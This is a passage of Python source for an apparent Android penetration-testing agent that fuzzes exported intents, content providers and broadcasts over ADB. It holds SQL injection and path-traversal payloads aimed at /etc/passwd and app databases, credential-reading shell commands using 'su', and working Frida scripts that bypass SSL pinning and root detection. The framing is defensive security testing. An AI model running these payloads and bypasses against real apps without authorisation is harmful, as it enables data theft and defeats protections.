        "pattern": r'getString\(R\.string\.(?:is_admin|is_root|is_debug|admin_mode|debug_mode)\)|(?:is_admin|isAdmin|is_root|isRoot|admin_mode|debug_mode)\s*[=.]\s*(?:"(?:yes|no|true|false)"|\btrue\b|\bfalse\b)',
        "severity": "MEDIUM",
        "category": "Weak Authentication",
        "title": "Boolean auth/admin flag in resources or code",
        "description": "Authentication decision based on a patchable string/boolean flag — attacker can recompile APK with flag changed",
        "recommendation": "Move authorization checks to server-side; never rely on client-side flags for access control",
    },
    "Keyboard Cache Risk": {
        "pattern": r'\(EditText\).*(?:password|Password|account|Account)',
        "severity": "MEDIUM",
        "category": "Information Leakage",
        "title": "Sensitive input field may cache to keyboard",
        "description": "EditText for sensitive data (password, account) without inputType restriction — keyboard may cache input for autocomplete",
        "recommendation": "Set android:inputType='textPassword' or 'textNoSuggestions' and android:importantForAutofill='no' on sensitive fields",
    },
}


class AndroHunterAgent:
    """AndroHunter-style comprehensive security testing via ADB.
    Provides intent fuzzing, content provider fuzzing, broadcast fuzzing,
    FileProvider analysis, StrandHogg detection, and DEX secret scanning."""

    def __init__(self, adb_path: str = ADB_PATH):
        self.adb_path = adb_path

    async def _shell(self, cmd: str, timeout: int = 15) -> str:
        out, _, _ = await _exec([self.adb_path, "shell", cmd], timeout=timeout)
        return out

    async def _get_exported_components(self, package: str) -> dict:
        """Get all exported components via dumpsys."""
        dump = await self._shell(f"dumpsys package {package}", timeout=15)
        components = {"activities": [], "services": [], "receivers": [], "providers": []}

        section = None
        for line in dump.splitlines():
            stripped = line.strip()
            if "Activity Resolver Table:" in line or "activity" in stripped.lower() and "filter" in stripped.lower():
                section = "activities"
            elif "Service Resolver Table:" in line:
                section = "services"
            elif "Receiver Resolver Table:" in line:
                section = "receivers"
            elif "Provider" in line and ("Authorities" in line or "authority" in line.lower()):
                section = "providers"

            if package in stripped:
                comp_name = ""
                for part in stripped.split():
                    if package in part:
                        comp_name = part.strip("{}[](),")
                        break
                if comp_name and comp_name not in components.get(section or "activities", []):
                    if section and section in components:
                        components[section].append(comp_name)

        pm_dump = await self._shell(f"pm dump {package} | grep -E 'exported=true'", timeout=10)
        for line in pm_dump.splitlines():
            stripped = line.strip()
            for part in stripped.split():
                if package in part:
                    name = part.strip("{}[](),")
                    for key in components:
                        if name not in components[key]:
                            if "activity" in stripped.lower() and key == "activities":
                                components[key].append(name)
                            elif "service" in stripped.lower() and key == "services":
                                components[key].append(name)
                            elif "receiver" in stripped.lower() and key == "receivers":
                                components[key].append(name)
                            elif "provider" in stripped.lower() and key == "providers":
                                components[key].append(name)

        return components

    VULN_PATTERNS = {
        "SQLi": ["sql", "syntax error", "mysql", "sqlite", "ora-", "sqlstate", "no such column"],
        "XSS": ["<script>", "onerror=", "alert("],
        "LFI": ["root:x:0:0", "/bin/bash", "php version"],
        "Redirect": ["evil.com", "302", "301"],
        "Template": ["49", "7777777"],
        "CmdI": ["uid=", "gid=", "groups="],
        "IDOR": ["user_id", "email", "token", "secret"],
    }

    @staticmethod
    def _classify_response(category: str, result_text: str, logcat: str = "") -> str:
        """Classify fuzzing result as VULN / SUSP / SAFE (matches AndroHunter Payload Engine)."""
        combined = (result_text + " " + logcat).lower()
        patterns = AndroHunterAgent.VULN_PATTERNS.get(category, [])
        if patterns and any(w in combined for w in patterns):
            return "VULN"
        if any(w in combined for w in ["exception", "crash", "died", "error"]):
            return "SUSP"
        return "SAFE"

    async def fuzz_intents(self, package: str, progress_cb: Optional[Callable] = None) -> dict:
        """Fuzz exported activities with crafted intents + Payload Engine classification."""
        findings = []
        components = await self._get_exported_components(package)
        activities = components["activities"][:20]
        total = len(activities) * len(INTENT_PAYLOADS)
        done = 0

        for act in activities:
            comp = act if "/" in act else f"{package}/{act}"
            for payload in INTENT_PAYLOADS:
                if progress_cb:
                    pct = int((done / max(total, 1)) * 100)
                    await progress_cb("hunter", pct, f"Fuzzing {comp}...")
                done += 1

                cmd_parts = ["am", "start", "-n", comp]
                if "data" in payload:
                    data = payload["data"].replace("{pkg}", package)
                    cmd_parts += ["-d", f"'{data}'"]
                if "extras" in payload:
                    for k, v in payload["extras"].items():
                        cmd_parts += ["--es", k, f"'{v}'"]

                result = await self._shell(" ".join(cmd_parts), timeout=5)
                crashed = "error" in result.lower() or "exception" in result.lower() or "died" in result.lower()
                launched = "starting" in result.lower() or result.strip() == ""

                logcat = ""
                if launched:
                    await asyncio.sleep(0.3)
                    logcat = await self._shell("logcat -d -t 5 --pid=$(pidof " + package + ") 2>/dev/null", timeout=5)

                classification = self._classify_response(payload["category"], result, logcat)

                if crashed or classification == "VULN":
                    findings.append({
                        "severity": "CRITICAL" if classification == "VULN" else "HIGH",
                        "category": f"Intent Fuzzing/{payload['category']}",
                        "title": f"{'VULN' if classification == 'VULN' else 'Crash'}: {comp} — {payload['name']}",
                        "description": result[:300],
                        "evidence": " ".join(cmd_parts),
                        "classification": classification,
                        "recommendation": "Validate all Intent inputs; handle exceptions gracefully",
                    })
                elif classification == "SUSP" or (launched and payload["category"] in ("LFI", "SQLi", "XSS", "CmdI")):
                    if any(w in logcat.lower() for w in ["filenotfound", "sql", "content://", "permission denied", "exception"]):
                        findings.append({
                            "severity": "MEDIUM",
                            "category": f"Intent Fuzzing/{payload['category']}",
                            "title": f"SUSP: {comp} — {payload['name']}",
                            "description": "Activity processed potentially malicious input",
                            "evidence": logcat[:200],
                            "classification": "SUSP",
                        })

        return {
            "success": True, "findings": findings,
            "activities_tested": len(activities),
            "payloads_sent": done,
        }

    async def fuzz_providers(self, package: str, progress_cb: Optional[Callable] = None) -> dict:
        """Fuzz exported content providers with SQL injection payloads."""
        findings = []

        uris_out = await self._shell(
            f"pm dump {package} | grep -i 'authority\\|content://'", timeout=10
        )
        authorities = set()
        for line in uris_out.splitlines():
            for match in re.findall(r'authority[=:]\s*([^\s;]+)', line, re.I):
                authorities.add(match.strip())
            for match in re.findall(r'content://([^/\s]+)', line):
                authorities.add(match.strip())

        if not authorities:
            dump = await self._shell(f"dumpsys package {package}", timeout=10)
            for match in re.findall(r'(?:authority|authorities)[=:]\s*([^\s;]+)', dump, re.I):
                authorities.add(match.strip())

        authorities = list(authorities)[:15]
        total = len(authorities) * len(SQLI_PAYLOADS) + len(authorities)
        done = 0

        for auth in authorities:
            uri = f"content://{auth}"

            if progress_cb:
                await progress_cb("hunter", int((done / max(total, 1)) * 100), f"Testing {auth}...")
            done += 1

            read_out = await self._shell(f"content query --uri {uri}", timeout=5)
            if read_out and "no result" not in read_out.lower() and "error" not in read_out.lower()[:50]:
                findings.append({
                    "severity": "HIGH", "category": "Content Provider/Readable",
                    "title": f"Readable provider: {auth}",
                    "description": f"Provider returned data without authentication",
                    "evidence": read_out[:300],
                    "recommendation": "Add proper permission checks to ContentProvider",
                })

            for payload in SQLI_PAYLOADS:
                if progress_cb:
                    await progress_cb("hunter", int((done / max(total, 1)) * 100), f"SQLi on {auth}...")
                done += 1

                test_uri = f"content://{auth}/--sqli"
                result = await self._shell(
                    f"content query --uri '{test_uri}' --where \"{payload}\"", timeout=5
                )

                is_vuln = False
                vuln_type = ""
                if "sqlite" in result.lower() or "sql" in result.lower():
                    is_vuln = True
                    vuln_type = "Error-based SQLi"
                elif "row" in result.lower() and "no result" not in result.lower():
                    is_vuln = True
                    vuln_type = "Boolean-based SQLi"
                elif "CREATE TABLE" in result or "sqlite_master" in result:
                    is_vuln = True
                    vuln_type = "UNION-based SQLi"

                if is_vuln:
                    findings.append({
                        "severity": "CRITICAL", "category": f"Content Provider/{vuln_type}",
                        "title": f"{vuln_type} on {auth}",
                        "description": f"Payload: {payload}",
                        "evidence": result[:300],
                        "recommendation": "Use parameterized queries; never concatenate user input into SQL",
                    })
                    break

        return {
            "success": True, "findings": findings,
            "providers_tested": len(authorities),
        }

    async def fuzz_broadcasts(self, package: str, progress_cb: Optional[Callable] = None) -> dict:
        """Send crafted broadcast intents to exported receivers (10 payloads, 6 categories)."""
        findings = []
        components = await self._get_exported_components(package)
        receivers = components["receivers"][:15]

        total = len(BROADCAST_PAYLOADS) + len(receivers)
        done = 0

        for payload in BROADCAST_PAYLOADS:
            if progress_cb:
                await progress_cb("hunter", int((done / max(total, 1)) * 100), f"Broadcast: {payload['name']}...")
            done += 1

            action = payload["action"].replace("{pkg}", package)
            extras_parts = []
            for k, v in payload.get("extras", {}).items():
                v_resolved = v.replace("{pkg}", package)
                extras_parts += ["--es", k, f"'{v_resolved}'"]

            cmd = f"am broadcast -a {action} -p {package} " + " ".join(extras_parts)
            result = await self._shell(cmd, timeout=5)

            delivered = "broadcast" in result.lower() or "result" in result.lower()
            if delivered and "not found" not in result.lower():
                await asyncio.sleep(0.3)
                logcat = await self._shell("logcat -d -t 5 2>/dev/null | tail -5", timeout=5)
                suspicious = any(w in logcat.lower() for w in [
                    "exception", "error", "sql", "crash", "auth", "granted", "admin"
                ])

                base_sev = payload.get("severity", "MEDIUM")
                severity = base_sev if suspicious else "LOW"
                classification = self._classify_response(payload["category"], result, logcat)
                if classification == "VULN":
                    severity = "CRITICAL"
                elif classification == "SUSP":
                    severity = base_sev

                findings.append({
                    "severity": severity,
                    "category": f"Broadcast Fuzzing/{payload['category']}",
                    "title": f"Broadcast delivered: {payload['name']}",
                    "description": f"Action: {action}",
                    "evidence": (result + "\n" + logcat)[:300] if suspicious else result[:200],
                    "classification": classification,
                    "recommendation": "Verify broadcast receiver validates sender and input data",
                })

        return {
            "success": True, "findings": findings,
            "payloads_sent": len(BROADCAST_PAYLOADS),
            "receivers": len(receivers),
        }

    async def analyze_fileproviders(self, package: str, apk_path: str = None,
                                     progress_cb: Optional[Callable] = None) -> dict:
        """Analyze FileProvider paths for traversal risks."""
        findings = []

        if progress_cb:
            await progress_cb("hunter", 10, "Analyzing FileProvider paths...")

        path_configs = []
        if apk_path and os.path.exists(apk_path):
            try:
                with zipfile.ZipFile(apk_path, "r") as zf:
                    for name in zf.namelist():
                        if "xml" in name.lower() and ("file" in name.lower() or "path" in name.lower()):
                            try:
                                content = zf.read(name).decode("utf-8", errors="replace")
                                path_configs.append((name, content))
                            except Exception:
                                pass
            except Exception:
                pass

        risk_map = {
            "root-path": ("CRITICAL", "Full filesystem access"),
            "files-path": ("LOW", "App internal files"),
            "cache-path": ("MEDIUM", "App cache directory"),
            "external-path": ("HIGH", "External storage"),
            "external-files-path": ("MEDIUM", "App external files"),
            "external-cache-path": ("MEDIUM", "App external cache"),
        }

        for config_name, content in path_configs:
            for path_type, (severity, desc) in risk_map.items():
                if path_type in content:
                    empty_path = re.search(rf'<{path_type}\s+[^>]*path\s*=\s*["\'][\s.]*["\']', content)
                    if empty_path or (path_type == "root-path"):
                        findings.append({
                            "severity": severity,
                            "category": "FileProvider",
                            "title": f"{path_type} configured" + (" with empty path" if empty_path else ""),
                            "description": f"{desc} – found in {config_name}",
                            "evidence": content[:200],
                            "recommendation": "Restrict FileProvider paths; avoid root-path with empty path",
                        })

        if progress_cb:
            await progress_cb("hunter", 50, "Testing path traversal...")

        authorities = []
        dump = await self._shell(f"dumpsys package {package} | grep -i fileprovider", timeout=10)
        for match in re.findall(r'authority[=:]\s*([^\s;]+)', dump, re.I):
            if "fileprovider" in match.lower():
                authorities.append(match.strip())
        if not authorities:
            authorities = [f"{package}.fileprovider", f"{package}.FileProvider"]

        traversal_payloads = [
            "../",
            "../../",
            "../../../",
            "../../../../etc/passwd",
            "../../../../data/data/{pkg}/databases/",
            "../../../../data/data/{pkg}/shared_prefs/",
            "../../../../proc/self/cmdline",
            "%2e%2e%2f%2e%2e%2f",
            "..%2F..%2F",
        ]

        for auth in authorities[:3]:
            for trav in traversal_payloads:
                path = trav.replace("{pkg}", package)
                uri = f"content://{auth}/root/{path}"
                result = await self._shell(f"content read --uri '{uri}' 2>&1", timeout=5)
                stripped = result.strip() if result else ""
                is_vuln = (
                    stripped
                    and len(stripped) > 5
                    and not stripped.startswith("ERR")
                    and "error" not in stripped.lower()[:30]
                    and "exception" not in stripped.lower()[:30]
                    and "permission" not in stripped.lower()[:40]
                    and "securityexception" not in stripped.lower()
                )
                if is_vuln:
                    findings.append({
                        "severity": "CRITICAL",
                        "category": "FileProvider/Path Traversal",
                        "title": f"Path traversal successful via {auth}",
                        "description": f"URI: {uri}",
                        "evidence": stripped[:300],
                        "adb_command": f"adb shell content read --uri '{uri}'",
                        "recommendation": "Restrict FileProvider paths; validate resolved paths",
                    })

        return {"success": True, "findings": findings}

    async def check_task_hijack(self, package: str,
                                 progress_cb: Optional[Callable] = None) -> dict:
        """Check for StrandHogg (task affinity hijacking) vulnerability."""
        findings = []

        if progress_cb:
            await progress_cb("hunter", 30, "Checking task affinity...")

        dump = await self._shell(f"dumpsys package {package}", timeout=10)

        custom_affinity = []
        empty_affinity = []
        for line in dump.splitlines():
            if "taskAffinity" in line:
                stripped = line.strip()
                if "taskAffinity=" in stripped:
                    aff_match = re.search(r'taskAffinity=([^\s]+)', stripped)
                    if aff_match:
                        aff = aff_match.group(1)
                        if aff and aff != package and aff != "null":
                            custom_affinity.append(aff)
                        elif aff == "" or aff == '""':
                            empty_affinity.append(stripped)

        if custom_affinity:
            findings.append({
                "severity": "HIGH", "category": "StrandHogg/Task Hijack",
                "title": f"Custom taskAffinity found ({len(custom_affinity)} components)",
                "description": "Activities with custom taskAffinity can be hijacked by malicious apps",
                "evidence": "\n".join(custom_affinity[:5]),
                "recommendation": "Set taskAffinity=\"\" for sensitive activities; use launchMode='singleTask'",
            })

        if empty_affinity:
            findings.append({
                "severity": "MEDIUM", "category": "StrandHogg/Task Hijack",
                "title": "Empty taskAffinity detected",
                "description": "Activities with empty taskAffinity may be vulnerable to task reparenting",
                "evidence": "\n".join(empty_affinity[:3]),
            })

        launch_mode = await self._shell(f"dumpsys package {package} | grep launchMode", timeout=5)
        if "standard" in launch_mode.lower() or (launch_mode.strip() and "singleTask" not in launch_mode):
            findings.append({
                "severity": "LOW", "category": "StrandHogg/Task Hijack",
                "title": "Activities use standard launch mode",
                "description": "Standard launchMode activities are more susceptible to task hijacking",
                "recommendation": "Consider using singleTask for sensitive activities",
            })

        return {"success": True, "findings": findings}

    async def scan_dex_secrets(self, apk_path: str,
                                progress_cb: Optional[Callable] = None) -> dict:
        """Deep scan DEX files for hardcoded secrets with severity classification."""
        findings = []

        if not os.path.exists(apk_path):
            return {"success": False, "error": "APK not found", "findings": []}

        if progress_cb:
            await progress_cb("hunter", 10, "Extracting DEX files...")

        dex_strings = []
        try:
            with zipfile.ZipFile(apk_path, "r") as zf:
                dex_files = [n for n in zf.namelist() if n.endswith(".dex")]
                for i, dex_name in enumerate(dex_files):
                    if progress_cb:
                        await progress_cb("hunter", 10 + int((i / max(len(dex_files), 1)) * 60),
                                          f"Scanning {dex_name}...")
                    try:
                        raw = zf.read(dex_name)
                        printable = re.findall(rb'[\x20-\x7E]{8,}', raw)
                        strings_text = "\n".join(s.decode("ascii", errors="replace") for s in printable)
                        dex_strings.append((dex_name, strings_text))
                    except Exception:
                        pass
        except Exception as e:
            return {"success": False, "error": str(e), "findings": []}

        if progress_cb:
            await progress_cb("hunter", 75, "Pattern matching...")

        _LIB_DOMAINS = {"schema.org", "googleapis.com", "google.com", "google-analytics.com",
                        "gstatic.com", "doubleclick.net", "android.com", "xmlpull.org",
                        "w3.org", "apache.org", "googletagmanager.com"}

        seen = set()
        for dex_name, content in dex_strings:
            for label, (pattern, severity_class) in DEX_SECRET_PATTERNS.items():
                try:
                    for m in re.finditer(pattern, content):
                        val = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                        if not val or len(val) < 8:
                            continue
                        if label in ("HTTP Endpoint",) and any(d in val for d in _LIB_DOMAINS):
                            continue
                        key = (label, val[:60])
                        if key in seen:
                            continue
                        seen.add(key)

                        sev_map = {"VULN": "CRITICAL", "SUSP": "MEDIUM", "INFO": "LOW"}
                        severity = sev_map.get(severity_class, "MEDIUM")
                        findings.append({
                            "severity": severity,
                            "category": f"DEX Secrets/{label}",
                            "title": f"{label} in {dex_name}",
                            "description": val[:200],
                            "location": dex_name,
                            "evidence": val[:300],
                            "classification": severity_class,
                            "recommendation": "Remove hardcoded secrets; use Android Keystore or server-side config",
                        })

                        if len(findings) > 200:
                            break
                except Exception:
                    pass

        if progress_cb:
            await progress_cb("hunter", 80, "Scanning code-level vulnerabilities...")

        for dex_name, content in dex_strings:
            for label, info in DEX_CODE_PATTERNS.items():
                try:
                    for m in re.finditer(info["pattern"], content):
                        val = m.group(0)
                        key = (label, val[:60])
                        if key in seen:
                            continue
                        seen.add(key)
                        findings.append({
                            "severity": info["severity"],
                            "category": info["category"],
                            "title": f"{info['title']} in {dex_name}",
                            "description": info["description"],
                            "location": dex_name,
                            "evidence": val[:300],
                            "classification": "VULN" if info["severity"] in ("CRITICAL", "HIGH") else "SUSP",
                            "recommendation": info["recommendation"],
                        })
                        if len(findings) > 200:
                            break
                except Exception:
                    pass

        if progress_cb:
            await progress_cb("hunter", 100, f"DEX scan complete: {len(findings)} findings")

        return {
            "success": True, "findings": findings,
            "dex_files": len(dex_strings),
            "secrets_found": len(findings),
        }

    # ── SharedPrefs Reader (matches AndroHunter SharedPrefsScreen) ──

    SENSITIVE_KEYS = [
        "token", "password", "passwd", "secret", "key", "auth", "session",
        "credential", "api", "jwt", "bearer", "cookie", "hash", "pin", "code",
    ]

    async def read_shared_prefs(self, package: str,
                                 progress_cb: Optional[Callable] = None) -> dict:
        """Read SharedPreferences and flag entries with sensitive keys."""
        if progress_cb:
            await progress_cb("hunter", 10, "Reading SharedPreferences...")

        prefs_list = await self._shell(f"run-as {package} ls shared_prefs/ 2>/dev/null")
        if not prefs_list or "No such" in prefs_list or "not debuggable" in prefs_list.lower():
            prefs_list = await self._shell(f"su 0 ls /data/data/{package}/shared_prefs/ 2>/dev/null")

        entries = []
        findings = []
        files = [f.strip() for f in prefs_list.splitlines() if f.strip().endswith(".xml")]

        for i, pf in enumerate(files[:20]):
            if progress_cb:
                await progress_cb("hunter", 10 + int((i / max(len(files), 1)) * 80), f"Reading {pf}...")

            content = await self._shell(f"run-as {package} cat shared_prefs/{pf} 2>/dev/null")
            if not content or "not debuggable" in content.lower():
                content = await self._shell(f"su 0 cat /data/data/{package}/shared_prefs/{pf} 2>/dev/null")
            if not content:
                continue

            for match in re.finditer(r'name="([^"]+)"[^>]*>([^<]*)<', content):
                key, value = match.group(1), match.group(2).strip()
                if not value:
                    v_match = re.search(rf'name="{re.escape(key)}"[^>]*value="([^"]*)"', content)
                    if v_match:
                        value = v_match.group(1)
                is_sens = any(sk in key.lower() for sk in self.SENSITIVE_KEYS)
                entries.append({"file": pf, "key": key, "value": value[:300], "sensitive": is_sens})
                if is_sens and value:
                    findings.append({
                        "severity": "HIGH",
                        "category": "SharedPrefs/Sensitive Data",
                        "title": f"Sensitive key '{key}' in {pf}",
                        "description": f"Value: {value[:100]}",
                        "evidence": f"[{pf}] {key}={value[:200]}",
                        "recommendation": "Use EncryptedSharedPreferences or Android Keystore",
                    })

        return {
            "success": True,
            "findings": findings,
            "entries": entries,
            "files": files,
            "total_entries": len(entries),
            "sensitive_count": sum(1 for e in entries if e["sensitive"]),
        }

    # ── Manifest Viewer (matches AndroHunter ManifestViewerScreen) ──

    DANGEROUS_PERMS = [
        "CAMERA", "MICROPHONE", "LOCATION", "CONTACTS", "STORAGE", "PHONE",
        "SMS", "RECORD_AUDIO", "ACCESSIBILITY", "BIND_", "INSTALL_PACKAGES",
        "SYSTEM_ALERT",
    ]

    async def analyze_manifest(self, package: str,
                                progress_cb: Optional[Callable] = None) -> dict:
        """Analyze AndroidManifest components, permissions, and risk flags."""
        if progress_cb:
            await progress_cb("hunter", 10, "Dumping manifest...")

        dump = await self._shell(f"dumpsys package {package}", timeout=15)
        findings = []
        components = []

        is_debuggable = "DEBUGGABLE" in dump
        allow_backup = "allowBackup=true" in dump
        cleartext = "usesCleartextTraffic=true" in dump or "usesCleartextTraffic" not in dump

        perms_out = await self._shell(f"dumpsys package {package} | grep 'android.permission'", timeout=10)
        permissions = list({
            line.strip().split(".")[-1]
            for line in perms_out.splitlines()
            if "android.permission" in line
        })
        dangerous_perms = [p for p in permissions if any(d in p.upper() for d in self.DANGEROUS_PERMS)]

        for comp_type in ["activity", "service", "receiver", "provider"]:
            section = await self._shell(
                f"dumpsys package {package} | grep -A3 '{comp_type} '", timeout=10
            )
            for line in section.splitlines():
                stripped = line.strip()
                if package not in stripped:
                    continue
                name = ""
                for part in stripped.split():
                    if package in part:
                        name = part.strip("{}[](),")
                        break
                if not name:
                    continue
                exported = "exported=true" in stripped
                permission = None
                perm_match = re.search(r'permission=([^\s]+)', stripped)
                if perm_match:
                    permission = perm_match.group(1)

                if comp_type == "provider":
                    severity = "HIGH" if exported and not permission else ("MEDIUM" if exported else "INFO")
                else:
                    severity = "HIGH" if exported and not permission else ("MEDIUM" if exported else "INFO")

                components.append({
                    "type": comp_type,
                    "name": name.split(".")[-1] if "." in name else name,
                    "full_name": name,
                    "exported": exported,
                    "permission": permission,
                    "severity": severity,
                })

        target_sdk = None
        sdk_match = re.search(r"targetSdk(?:Version)?[=:]\s*(\d+)", dump)
        if sdk_match:
            target_sdk = int(sdk_match.group(1))

        exported_count = sum(1 for c in components if c["exported"])
        risk_chips = []
        if is_debuggable:
            risk_chips.append({"label": "DEBUG", "severity": "CRITICAL"})
            findings.append({
                "severity": "CRITICAL", "category": "Manifest/Debug",
                "title": "Application is debuggable",
                "description": "android:debuggable=true allows attaching a debugger and extracting app data",
                "recommendation": "Remove debuggable flag in release builds",
            })
        if allow_backup:
            risk_chips.append({"label": "BACKUP", "severity": "HIGH"})
            findings.append({
                "severity": "HIGH", "category": "Manifest/Backup",
                "title": "Application backup enabled",
                "description": "android:allowBackup=true allows data extraction via adb backup",
                "recommendation": "Set android:allowBackup='false'",
            })
        if cleartext:
            risk_chips.append({"label": "CLEARTEXT", "severity": "HIGH"})
            findings.append({
                "severity": "HIGH", "category": "Manifest/Network",
                "title": "Cleartext (HTTP) traffic permitted",
                "description": "App allows unencrypted HTTP communication, enabling MITM attacks",
                "recommendation": "Set usesCleartextTraffic=false and use HTTPS only",
            })
        if target_sdk and target_sdk < 23:
            risk_chips.append({"label": f"SDK {target_sdk}", "severity": "HIGH"})
            findings.append({
                "severity": "HIGH", "category": "Manifest/SDK",
                "title": f"Low targetSdkVersion ({target_sdk})",
                "description": f"targetSdkVersion={target_sdk} (< 23) bypasses runtime permissions — all permissions auto-granted at install",
                "recommendation": "Raise targetSdkVersion to 33+ and implement runtime permission requests",
            })
        if target_sdk and target_sdk < 28:
            findings.append({
                "severity": "MEDIUM", "category": "Manifest/SDK",
                "title": f"targetSdkVersion below 28 ({target_sdk})",
                "description": "Apps targeting < API 28 default to usesCleartextTraffic=true",
                "recommendation": "Upgrade targetSdkVersion and add network security config",
            })
        if exported_count > 3:
            risk_chips.append({"label": f"{exported_count} EXPORTED", "severity": "HIGH"})
        if len(dangerous_perms) > 5:
            risk_chips.append({"label": f"{len(dangerous_perms)} DANGEROUS PERMS", "severity": "MEDIUM"})

        sms_perms = [p for p in permissions if "SMS" in p.upper()]
        if sms_perms:
            findings.append({
                "severity": "HIGH", "category": "Manifest/Permissions",
                "title": f"SMS permissions: {', '.join(sms_perms)}",
                "description": "App has SMS permissions which could be abused to exfiltrate data",
                "recommendation": "Remove SEND_SMS if not core functionality; review SMS usage for data leaks",
            })
        phone_perms = [p for p in permissions if "PHONE" in p.upper() or "CALL_LOG" in p.upper()]
        if phone_perms:
            findings.append({
                "severity": "MEDIUM", "category": "Manifest/Permissions",
                "title": f"Phone/call permissions: {', '.join(phone_perms)}",
                "description": "App accesses phone state or call logs without clear necessity for banking",
                "recommendation": "Evaluate if these permissions are strictly necessary",
            })
        location_perms = [p for p in permissions if "LOCATION" in p.upper()]
        contact_perms = [p for p in permissions if "CONTACT" in p.upper() or "PROFILE" in p.upper()]
        if location_perms:
            findings.append({
                "severity": "MEDIUM", "category": "Manifest/Permissions",
                "title": f"Location permissions: {', '.join(location_perms)}",
                "description": "App collects location data",
                "recommendation": "Verify location is needed; use coarse-only if possible",
            })
        if contact_perms:
            findings.append({
                "severity": "MEDIUM", "category": "Manifest/Permissions",
                "title": f"Contact/profile permissions: {', '.join(contact_perms)}",
                "description": "App reads contacts and user profile data",
                "recommendation": "Remove if not required for app functionality",
            })

        for c in components:
            if c["severity"] == "HIGH":
                comp_desc = f"Full name: {c['full_name']}"
                if c["type"] == "provider":
                    comp_desc += ". Exported ContentProvider without permission allows any app to query/modify data (SQL injection risk)."
                elif c["type"] == "receiver":
                    comp_desc += ". Exported BroadcastReceiver can be triggered by any app — may leak data or execute privileged actions."
                elif c["type"] == "activity":
                    comp_desc += ". Exported Activity can be launched without authentication — potential auth bypass."
                findings.append({
                    "severity": "HIGH",
                    "category": f"Manifest/Exported {c['type'].title()}",
                    "title": f"Exported {c['type']} without permission: {c['name']}",
                    "description": comp_desc,
                    "recommendation": "Add permission protection or set exported=false",
                })

        return {
            "success": True,
            "findings": findings,
            "components": components,
            "permissions": permissions,
            "dangerous_perms": dangerous_perms,
            "risk_chips": risk_chips,
            "is_debuggable": is_debuggable,
            "allow_backup": allow_backup,
            "cleartext_traffic": cleartext,
            "target_sdk": target_sdk,
            "exported_count": exported_count,
        }

    # ── Activity Launcher (matches AndroHunter ActivityLauncherScreen) ──

    async def list_activities(self, package: str,
                               progress_cb: Optional[Callable] = None) -> dict:
        """List all activities (exported and non-exported) with launch support."""
        if progress_cb:
            await progress_cb("hunter", 20, "Enumerating activities...")

        dump = await self._shell(f"dumpsys package {package} | grep -E 'activity|Activity'", timeout=10)
        activities = []
        seen = set()
        for line in dump.splitlines():
            for part in line.strip().split():
                if package in part:
                    name = part.strip("{}[](),")
                    if name and name not in seen and "/" not in name:
                        exported = "exported=true" in line
                        seen.add(name)
                        activities.append({
                            "name": name.split(".")[-1] if "." in name else name,
                            "full_name": name,
                            "exported": exported,
                        })

        return {"success": True, "activities": activities, "count": len(activities)}

    async def launch_activity(self, package: str, activity: str,
                               data_uri: str = "", extras: dict = None,
                               progress_cb: Optional[Callable] = None) -> dict:
        """Launch a specific activity with optional data URI and extras."""
        comp = activity if "/" in activity else f"{package}/{activity}"
        cmd_parts = ["am", "start", "-n", comp]
        if data_uri:
            cmd_parts += ["-d", f"'{data_uri}'"]
        if extras:
            for k, v in extras.items():
                cmd_parts += ["--es", k, f"'{v}'"]

        result = await self._shell(" ".join(cmd_parts), timeout=10)
        success = "error" not in result.lower() or "starting" in result.lower()
        return {
            "success": success,
            "command": " ".join(cmd_parts),
            "output": result,
        }

    # ── Frida Script Generator (matches AndroHunter FridaGeneratorScreen) ──

    FRIDA_TEMPLATES = {
        "ssl_bypass": {
            "name": "SSL Pinning Bypass",
            "category": "SSL",
            "desc": "Bypass OkHttp3 CertificatePinner, TrustManager, and Conscrypt",
            "code": """Java.perform(function() {
    try {
        var CertPinning = Java.use('okhttp3.CertificatePinner');
        CertPinning.check.overload('java.lang.String','java.util.List').implementation = function(a,b){ return; };
        console.log('[+] OkHttp3 SSL bypass OK');
    } catch(e){}
    try {
        var X509 = Java.use('javax.net.ssl.X509TrustManager');
        var TrustManager = Java.registerClass({
            name: 'com.bypass.TrustManager',
            implements: [X509],
            methods: {
                checkClientTrusted: function(chain, authType){},
                checkServerTrusted: function(chain, authType){},
                getAcceptedIssuers: function(){ return []; }
            }
        });
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var ctx = SSLContext.getInstance('TLS');
        ctx.init(null, [TrustManager.$new()], null);
        SSLContext.getDefault.implementation = function(){ return ctx; };
        console.log('[+] TrustManager bypass OK');
    } catch(e){}
    try {
        var nativeLib = Java.use('com.google.android.gms.org.conscrypt.TrustManagerImpl');
        nativeLib.checkTrustedRecursive.implementation = function(a,b,c,d,e,f){ return []; };
        console.log('[+] Conscrypt bypass OK');
    } catch(e){}
});""",
        },
        "root_bypass": {
            "name": "Root Detection Bypass",
            "category": "Root",
            "desc": "Bypass RootBeer, SafetyNet, and file-based root checks",
            "code": """Java.perform(function() {
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function(){ return false; };
        RootBeer.isRootedWithoutBusyBox.implementation = function(){ return false; };
        console.log('[+] RootBeer bypass OK');
    } catch(e){}
    try {
        var SafetyNet = Java.use('com.google.android.gms.safetynet.SafetyNetApi');
        console.log('[+] SafetyNet hook attempted');
    } catch(e){}
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var suspicious = ['/su','/magisk','/system/bin/su','/sbin/su'];
        if(suspicious.some(function(p){ return path.includes(p); })) {
            console.log('[!] Root file check blocked: ' + path);
            return false;
        }
        return this.exists();
    };
    console.log('[+] File.exists hook OK');
});""",
        },
        "login_bypass": {
            "name": "Login Bypass",
            "category": "Auth",
            "desc": "Enumerate and hook auth/login/session classes to bypass authentication",
            "code": """Java.perform(function() {{
    try {{
        Java.enumerateLoadedClasses({{
            onMatch: function(name) {{
                if(name.includes('{pkg}') &&
                   (name.toLowerCase().includes('auth') ||
                    name.toLowerCase().includes('login') ||
                    name.toLowerCase().includes('session'))) {{
                    console.log('[+] Auth class found: ' + name);
                    try {{
                        var clazz = Java.use(name);
                        var methods = clazz.class.getDeclaredMethods();
                        methods.forEach(function(m) {{
                            if(m.getName().toLowerCase().includes('verify') ||
                               m.getName().toLowerCase().includes('check') ||
                               m.getName().toLowerCase().includes('valid')) {{
                                console.log('    [>] Hooking: ' + m.getName());
                            }}
                        }});
                    }} catch(e) {{}}
                }}
            }},
            onComplete: function() {{}}
        }});
    }} catch(e){{ console.log('[-] ' + e); }}
}});""",
        },
